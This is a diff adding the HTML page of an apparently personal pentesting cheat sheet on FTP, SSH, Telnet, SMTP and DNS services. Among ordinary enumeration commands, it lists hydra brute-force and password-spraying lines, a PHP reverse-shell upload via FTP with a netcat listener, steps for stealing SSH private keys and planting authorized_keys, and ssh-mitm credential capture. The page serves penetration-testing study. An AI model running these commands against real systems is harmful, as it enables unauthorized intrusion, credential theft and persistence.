@@ -1,0 +1,1364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Services Pentesting Cheat Sheet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Network Services Pentesting Cheat Sheet | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Network Services Pentesting Cheat Sheet" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="RedTeamer403 Security Portfolio" />
+<meta property="og:description" content="RedTeamer403 Security Portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/network/services/" />
+<meta property="og:url" content="http://localhost:4000/notes/network/services/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Network Services Pentesting Cheat Sheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Network Services Pentesting Cheat Sheet","url":"http://localhost:4000/notes/network/services/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/impacket/" >Impacket</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/useful/" >Online Resources</a>
+              <a href="/notes/cheat/shell/" >Reverse Shell</a>
+              <a href="/notes/cheat/wordlists/" >Wordlists</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" >Post Exploitation</a>
+              <a href="/notes/linux/services/" >Services</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/services/" class="active">Services</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+              <a href="/notes/tech/server/" >Web Servers</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" >Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="network-services-pentesting-cheat-sheet">Network Services Pentesting Cheat Sheet</h1>
+
+<!-- ------------------------------------------------FTP NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>FTP (21)</summary>
+  <p></p>
+
+  <h3 id="login">Login</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;IP&gt; <span class="c">#optional port</span>
+lftp &lt;IP&gt;
+anonymous:anonymous
+</code></pre></div>  </div>
+
+  <h3 id="commands">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd
+ls</span> <span class="nt">-a</span> <span class="c"># List all files (even hidden)</span>
+put &lt;filename&gt; <span class="c">#Upload file</span>
+get &lt;filename&gt; <span class="c">#Download file</span>
+mput/mget <span class="c">#Upload/Downlaod multiple files</span>
+quit
+</code></pre></div>  </div>
+  <h3 id="download-all-files">Download all files</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-m</span> ftp://anonymous:anonymous@10.10.10.98
+wget <span class="nt">-m</span> <span class="nt">--no-passive</span> ftp://anonymous:anonymous@10.10.10.98
+wget <span class="nt">-r</span> <span class="nt">--user</span><span class="o">=</span><span class="s2">"USERNAME"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"PASSWORD"</span> ftp://server.com/ <span class="c">#If your user/password has special characters</span>
+</code></pre></div>  </div>
+
+  <h3 id="automation">Automation</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#nmap</span>
+nmap <span class="nt">--script</span> ftp-<span class="k">*</span> <span class="nt">-p</span> 21 &lt;IP&gt;
+
+<span class="c">#metasploit</span>
+use auxiliary/scanner/ftp/anonymous
+use auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/ftp/ftp_bounce
+use auxiliary/scanner/ftp/bison_ftp_traversal
+use auxiliary/scanner/ftp/colorado_ftp_traversal
+use auxiliary/scanner/ftp/titanftp_xcrc_traversal
+
+<span class="c">#Enum dirs</span>
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> ftp://&lt;IP&gt; <span class="nt">-w</span> wordlist
+
+<span class="c">#Bruteforce</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; ftp
+hydra <span class="nt">-L</span> username.txt <span class="nt">-p</span> password &lt;target-ip&gt; ftp
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt ftp://&lt;target-ip&gt;
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password ftp://&lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="configuration">Configuration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/vsftpd.conf
+<span class="nb">cat</span> /etc/vsftpd/vsftpd.conf
+</code></pre></div>  </div>
+
+  <h3 id="reverse-shell">Reverse Shell</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <span class="nt">-O</span> shell.php
+<span class="c"># Edit some variables in shell.php</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'&lt;your-local-ip&gt;'</span><span class="p">;</span>
+<span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>
+<span class="c">#Upload</span>
+ftp &lt;target-ip&gt;
+<span class="c"># Upload the payload you downloaded</span>
+ftp&gt; put shell.php
+<span class="c"># Get shell</span>
+nc <span class="nt">-lvnp</span> 1234
+http://vulnerable.com/path/to/ftp/shell.php
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------SSH NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>SSH (22)</summary>
+  <p></p>
+
+  <h3 id="basic-commands">Basic commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl start ssh
+<span class="nb">sudo </span>systemctl stop ssh
+<span class="nb">sudo </span>systemctl restart ssh
+<span class="nb">sudo </span>systemctl status ssh
+ps <span class="nt">-e</span> | <span class="nb">grep </span>ssh
+<span class="c">#Config</span>
+vim /etc/ssh/sshd_config
+<span class="c">#Chek for any Connection</span>
+<span class="nb">who</span> | <span class="nb">grep</span> &lt;username&gt;
+<span class="c">#Kill Connections</span>
+<span class="c"># -f: full process name to match</span>
+<span class="nb">sudo </span>pkill <span class="nt">-f</span> pts/#
+<span class="c"># Authentication logs</span>
+<span class="nb">grep</span> <span class="s1">'sshd'</span> /var/log/auth.log
+</code></pre></div>  </div>
+
+  <h3 id="enumeration">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> ssh-brute <span class="nt">-p</span> 22 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> ssh-auth-methods <span class="nt">--script-args</span><span class="o">=</span><span class="s2">"ssh.user=username"</span> <span class="nt">-p</span> 22 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> ssh-<span class="k">*</span> <span class="nt">-p</span> 22 &lt;target-ip&gt;
+
+<span class="c"># User enumeration</span>
+msfconsole
+msf&gt; use auxiliary/scanner/ssh/ssh_enumusers
+
+<span class="c"># Banner and Audit</span>
+nc &lt;IP&gt; 22
+ssh-audit &lt;target-ip&gt;
+</code></pre></div>  </div>
+  <h3 id="bruteforce">Bruteforce</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -t: tasks</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; ssh <span class="nt">-t</span> 4
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; ssh <span class="nt">-t</span> 4
+
+<span class="c"># Specific ports</span>
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt <span class="nt">-s</span> 2222 &lt;target-ip&gt; ssh <span class="nt">-t</span> 4
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt ssh://&lt;target-ip&gt;:2222 <span class="nt">-t</span> 4
+
+<span class="c">#Password spraying</span>
+hydra <span class="nt">-L</span> usernames-list.txt <span class="nt">-p</span> Spring2025 ssh://10.1.1.10
+</code></pre></div>  </div>
+  <h3 id="crack-ssh-private-key">Crack SSH Private Key</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh2john private_key.txt <span class="o">&gt;</span> hash.txt
+<span class="c"># or</span>
+python2 /usr/share/john/ssh2john.py private_key.txt <span class="o">&gt;</span> hash.txt
+
+<span class="c"># Crack the password of the private key</span>
+john <span class="nt">--wordlist</span><span class="o">=</span>wordlist.txt hash.txt
+</code></pre></div>  </div>
+  <h3 id="connect">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh username@&lt;target-ip&gt;
+ssh username@&lt;target-ip&gt; <span class="nt">-p</span> 22
+
+<span class="c"># Using private key</span>
+ssh <span class="nt">-i</span> id_rsa username@&lt;target-ip&gt;
+
+<span class="c"># Without username</span>
+ssh 10.0.0.1
+
+<span class="c"># Additional options</span>
+<span class="c"># If we got the error message "no matching host key type found. Their offer: ssh-rsa..."</span>
+ssh <span class="nt">-o</span> <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa user@10.0.0.1
+<span class="c"># If we got error "no matching key exchange method found. Their offer: diffie-hellman-..."</span>
+ssh <span class="nt">-o</span> <span class="nv">KexAlgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1 user@10.0.0.1
+
+<span class="c">#Test connection</span>
+ssh <span class="nt">-T</span> username@10.0.0.1
+ssh <span class="nt">-T</span> username@10.0.0.1 <span class="nt">-vvv</span>
+
+<span class="c">#Command execution</span>
+ssh username@&lt;target-ip&gt; <span class="s1">'ls -l'</span>
+
+<span class="c">#Windows AD</span>
+ssh domain-name<span class="se">\\</span>username@domain-controller
+
+<span class="c">#Via Private Key</span>
+<span class="nb">cat</span> /home/&lt;victim-user&gt;/.ssh/id_rsa
+<span class="nb">echo</span> <span class="s1">'copied content of id_rsa'</span> <span class="o">&gt;</span> private_key.txt
+<span class="nb">chmod </span>600 private_key.txt
+ssh <span class="nt">-i</span> private_key.txt victim-user@&lt;remote-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="transfer-files">Transfer files</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Send a file</span>
+scp ./example.txt user@&lt;ip&gt;:./example.txt<span class="se">\</span>
+
+<span class="c"># Send a directory</span>
+scp <span class="nt">-r</span> ./example user@&lt;ip&gt;:/home/&lt;ip&gt;/
+
+<span class="c"># Download a file</span>
+scp user@&lt;ip&gt;:/home/&lt;user&gt;/path/to/file.txt <span class="nb">.</span>
+
+<span class="c"># Download a directory</span>
+scp <span class="nt">-r</span> user@&lt;ip&gt;:/home/&lt;user&gt;/path/to/file.txt <span class="nb">.</span>
+</code></pre></div>  </div>
+  <h3 id="create-ssh-keys">Create SSH Keys</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Specify the output file</span>
+ssh-keygen <span class="nt">-f</span> key
+
+<span class="c"># Specify Ed25519</span>
+ssy-keygen <span class="nt">-t</span> ed25519
+
+<span class="c">#In target machine install ssh</span>
+ssh-copy-id username@&lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="generate-ssh-keys-and-set-up-public-key-to-connect-remote-machine">Generate SSH Keys and Set Up Public Key to Connect Remote Machine</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Check if authorized_keys Exists in Remote Machine</span>
+<span class="nb">ls</span> /home/&lt;remote-user&gt;/.ssh/authorized_keys
+<span class="c">#If it exists, you may be able to connect SSH with your keys as victim user.</span>
+
+<span class="c">#Generate SSH Keys in Local Machine</span>
+ssh-keygen <span class="nt">-f</span> key
+
+<span class="c">#Copy the content of publick key</span>
+<span class="nb">cat</span> ./key.pub
+<span class="c">#Then copy the content of public key you generated.</span>
+
+<span class="c">#Add the Content of Publick Key to authorized_keys</span>
+<span class="c">#In remote machine</span>
+<span class="nb">echo</span> <span class="s1">'&lt;content of id_rsa.pub'</span> <span class="o">&gt;&gt;</span> /home/&lt;victim-user&gt;/.ssh/authorized_keys
+
+<span class="c">#Login with Private Key</span>
+<span class="c">#In local machine, we have a SSH private key in local machine so we can login the target SSH server with it.</span>
+<span class="c"># Change permission of the private key ('key', here)</span>
+<span class="nb">chmod </span>600 key
+<span class="c"># Login with it</span>
+ssh victim@&lt;target-ip&gt; <span class="nt">-i</span> key
+</code></pre></div>  </div>
+  <h3 id="stealing-credentials-via-mitm">Stealing Credentials via MiTM</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If not have the ssh-mitm, install first.</span>
+pip3 <span class="nb">install </span>ssh-mitm <span class="nt">--upgrade</span>
+
+<span class="c"># --enable-trivial-auth: The "trivial authentication" phishing attack</span>
+<span class="c"># --remote-host: Specify the target ip/domain</span>
+<span class="c"># --listen-port: Specify the ip address to listen in local machine</span>
+ssh-mitm server <span class="nt">--enable-trivial-auth</span> <span class="nt">--remote-host</span> example.com <span class="nt">--listen-port</span> 2222
+</code></pre></div>  </div>
+
+</details>
+
+<!-- ------------------------------------------------TELNET NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>Telnet (23)</summary>
+  <p></p>
+
+  <h3 id="enumeration-1">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">--script</span> <span class="s2">"*telnet*"</span> <span class="nt">-p</span> 23 <span class="o">{</span>IP<span class="o">}</span>
+nmap <span class="nt">--script</span> telnet-encryption <span class="nt">-p</span> 23 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> telnet-ntlm-info <span class="nt">-p</span> 23 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> telnet-brute <span class="nt">--script-args</span> <span class="nv">userdb</span><span class="o">=</span>users.txt,passdb<span class="o">=</span>passwords.txt,telnet-brute.timeout<span class="o">=</span>8s <span class="nt">-p</span> 23 &lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="configuration-1">Configuration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/inetd.conf
+<span class="c"># or</span>
+<span class="nb">cat</span> /etc/xinetd.d/telnet
+<span class="nb">cat</span> /etc/xinetd.d/stelnet
+</code></pre></div>  </div>
+
+  <h3 id="connect-1">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet &lt;target-ip&gt; &lt;target-port&gt;
+telnet &lt;target-ip&gt; 23
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------SMTP NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>SMTP (25/465/587)</summary>
+  <p></p>
+
+  <h3 id="enumeration-2">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> smtp-brute <span class="nt">-p</span> 25,465,587 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smtp-commands <span class="nt">-p</span> 25,465,587 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smtp-enum-users <span class="nt">-p</span> 25,465,587 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smtp-ntlm-info <span class="nt">--script-args</span> smtp-ntlm-info.domain<span class="o">=</span>example.com <span class="nt">-p</span> 25,465,587 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smtp-vuln-cve2011-1764 <span class="nt">-p</span> 25,465,587 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smtp-<span class="k">*</span> <span class="nt">-p</span> 25,465,587 &lt;target-ip&gt;
+
+<span class="c"># MX Domains</span>
+dig mx example.com
+
+<span class="c">#Metasploit</span>
+use auxiliary/scanner/smtp/smtp_enum
+</code></pre></div>  </div>
+
+  <h3 id="users">Users</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># VRFY - check if the user exists in the SMTP server</span>
+smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-u</span> &lt;username&gt; <span class="nt">-t</span> &lt;target-ip&gt;
+smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> usernames.txt <span class="nt">-t</span> &lt;target-ip&gt;
+
+<span class="c"># RCPT - check if the user is allowed to receive mails in the SMTP server</span>
+smtp-user-enum <span class="nt">-M</span> RCPT <span class="nt">-u</span> &lt;username&gt; <span class="nt">-t</span> &lt;target-ip&gt;
+smtp-user-enum <span class="nt">-M</span> RCPT <span class="nt">-U</span> usernames.txt <span class="nt">-t</span> &lt;target-ip&gt;
+
+<span class="c"># EXPN - reveal the actual email address</span>
+smtp-user-enum <span class="nt">-M</span> EXPN <span class="nt">-u</span> &lt;username&gt; <span class="nt">-t</span> &lt;target-ip&gt;
+smtp-user-enum <span class="nt">-M</span> EXPN <span class="nt">-D</span> &lt;<span class="nb">hostname</span><span class="o">&gt;</span> <span class="nt">-U</span> usernames.txt <span class="nt">-t</span> &lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="starttls">STARTTLS</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># port 25</span>
+openssl s_client <span class="nt">-starttls</span> smtp <span class="nt">-connect</span> &lt;target-ip&gt;:25
+<span class="c"># Port 465</span>
+openssl s_client <span class="nt">-crlf</span> <span class="nt">-connect</span> &lt;target-ip&gt;:465
+<span class="c"># Port 587</span>
+openssl s_client <span class="nt">-starttls</span> smtp <span class="nt">-crlf</span> <span class="nt">-connect</span> &lt;target-ip&gt;:587
+</code></pre></div>  </div>
+
+  <h3 id="connect-2">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;target-ip&gt; 25
+<span class="c"># or</span>
+telnet &lt;target-ip&gt; 25
+</code></pre></div>  </div>
+
+  <h3 id="commands-1">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Identify SMTP Server</span>
+helo example.com
+<span class="c"># List all supported enhanced functions</span>
+ehlo example.com
+<span class="c"># 8BITMIME - allow to send 8-bit data</span>
+<span class="c"># AUTH - authentication for the SMTP connection</span>
+<span class="c"># CHUNKING - transfer chunks of data</span>
+<span class="c"># DSN (Delivery Status Notifications) - notify delivery status</span>
+<span class="c"># ENHANCEDSTATUSCODES - allow to show more details of the status</span>
+<span class="c"># ETRN - process remote queue</span>
+<span class="c"># EXPN - expand mailing list</span>
+<span class="c"># HELP - help about commands</span>
+<span class="c"># PIPELINING - allow the multiple commands</span>
+<span class="c"># SIZE - maximum message size that can be received</span>
+<span class="c"># SMTPUTF8 -</span>
+<span class="c"># STARTTLS - communicate with TLS</span>
+<span class="c"># SEND - send message to terminal</span>
+<span class="c"># TURN - swap client and server</span>
+<span class="c"># VRFY - check if the user exists in the SMTP server</span>
+
+<span class="c"># Auth Login</span>
+<span class="c"># The AUTH LOGIN command allows us to login. We need to input username/password in Base64.</span>
+334 VXNlcm5hbWU6 <span class="c"># Base64-encoded "username:"</span>
+<span class="nv">dGVzdA</span><span class="o">==</span> <span class="c"># Base64-encoded "test"</span>
+334 UGFzc3dvcmQ6 <span class="c"># Base64-encoded "password:"</span>
+<span class="nv">cGFzc3dvcmQ</span><span class="o">=</span> <span class="c"># Base64-encoded "password"</span>
+
+<span class="c"># Messages</span>
+<span class="c">## 1. check if the user exists</span>
+vrfy &lt;username&gt;
+vrfy root
+<span class="c"># 2. set the address of the mail sender</span>
+mail from: &lt;username&gt;
+mail from: root
+mail from: sender@example.com
+<span class="c"># 3. set the address of the mail recipient</span>
+rcpt to: &lt;username&gt;
+rcpt to: root
+rcpt to: recipient@example.com
+<span class="c"># 4. send data of message (the message end with ".")</span>
+data
+subject: Test Mail
+This is a <span class="nb">test </span>mail.
+
+<span class="c"># process remote queue</span>
+etrn example.com
+<span class="c"># list the mailing list</span>
+expn example.com
+</code></pre></div>  </div>
+
+  <h3 id="send-mail">Send Mail</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Tool https://github.com/jetmore/swaks</span>
+swaks <span class="nt">--to</span> remote-user@example.com <span class="nt">--from</span> local-user@&lt;local-ip&gt; <span class="nt">--server</span> mail.example.com <span class="nt">--body</span> <span class="s2">"hello"</span>
+
+<span class="c"># --attach: Attach a file</span>
+swaks <span class="nt">--to</span> remote-user@example.com <span class="nt">--from</span> local-user@&lt;local-ip&gt; <span class="nt">--server</span> mail.example.com <span class="nt">--body</span> <span class="s2">"hello"</span> <span class="nt">--attach</span> @evil.docx
+</code></pre></div>  </div>
+
+  <h3 id="start-smtp-server">Start SMTP Server</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -n: No setuid</span>
+<span class="c"># -c: Classname</span>
+<span class="nb">sudo </span>python3 <span class="nt">-m</span> smtpd <span class="nt">-n</span> <span class="nt">-c</span> DebuggingServer 10.0.0.1:25
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------DNS NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>DNS (53)</summary>
+  <p></p>
+
+  <h3 id="enumeration-3">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap</span>
+nmap <span class="nt">--script</span> dns-nsec-enum <span class="nt">--script-args</span> dns-nsec-enum.domains vulnerable.com <span class="nt">-p</span> 53 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> dns-random-srcport <span class="nt">-p</span> 53 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> dns-recursion <span class="nt">-p</span> 53 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> dns-service-discovery <span class="nt">-p</span> 53 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> dns-<span class="k">*</span> <span class="nt">-p</span> 53 &lt;target-ip&gt;
+nmap <span class="nt">-n</span> <span class="nt">--script</span> <span class="s2">"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"</span> &lt;target-ip&gt;
+
+<span class="c"># Get IP address from the domain</span>
+host example.com
+
+<span class="c"># Reverse Lookup (Resolves domain name from IP address)</span>
+dig <span class="nt">-x</span> &lt;ip&gt;
+dig <span class="nt">-x</span> 8.8.8.8
+</code></pre></div>  </div>
+
+  <h3 id="online-tools">Online Tools</h3>
+  <p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
+
+  <h3 id="subdomain-discovery">Subdomain Discovery</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsenum <span class="nt">--dnsserver</span> &lt;target-ip&gt; <span class="nt">-f</span> wordlist.txt example.com
+
+<span class="c"># Do not scrape from Google search</span>
+<span class="c"># -p: The number of google search pages</span>
+<span class="c"># -s: The maximum number of subdomains that will be scraped from Google</span>
+dnsenum <span class="nt">--dnsserver</span> &lt;target-ip&gt; <span class="nt">--enum</span> <span class="nt">-p</span> 0 <span class="nt">-s</span> 0 <span class="nt">-f</span> wordlist.txt example.com
+
+<span class="c"># Fuzzing</span>
+<span class="c"># ffuf tool</span>
+ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/small.txt <span class="nt">-u</span> http://victim.htb/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.victim.htb"</span> <span class="nt">-c</span> <span class="nt">-fc</span> 301
+ffuf <span class="nt">-H</span> <span class="s2">"Host: FUZZ.</span><span class="nv">$DOMAIN</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: PENTEST"</span> <span class="nt">-c</span> <span class="nt">-w</span> <span class="s2">"/path/to/wordlist.txt"</span> <span class="nt">-u</span> <span class="nv">$URL</span>
+ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-w</span> <span class="s2">"/path/to/wordlist.txt"</span> <span class="nt">-u</span> <span class="s2">"http://FUZZ.</span><span class="nv">$TARGET</span><span class="s2">/"</span>
+<span class="c"># gobuster tool</span>
+gobuster vhost <span class="nt">--useragent</span> <span class="s2">"PENTEST"</span> <span class="nt">--wordlist</span> <span class="s2">"/path/to/wordlist.txt"</span> <span class="nt">--url</span> <span class="nv">$URL</span>
+<span class="c"># wfuzz tool</span>
+wfuzz <span class="nt">-H</span> <span class="s2">"Host: FUZZ.victim.com"</span> <span class="nt">--hc</span> 404,403 <span class="nt">-H</span> <span class="s2">"User-Agent: PENTEST"</span> <span class="nt">-c</span> <span class="nt">-z</span> file,<span class="s2">"/path/to/wordlist.txt"</span> <span class="nv">$URL</span>
+</code></pre></div>  </div>
+
+  <h3 id="dns-records">DNS Records</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ANY (all) record</span>
+did example.com ANY
+dig example.com @&lt;dns-ip&gt; ANY
+dig example.com +nocmd +noall +answer ANY
+
+<span class="c"># NS (nameserver) record</span>
+dig example.com NS
+
+<span class="c"># TXT record</span>
+dig example.com TXT
+
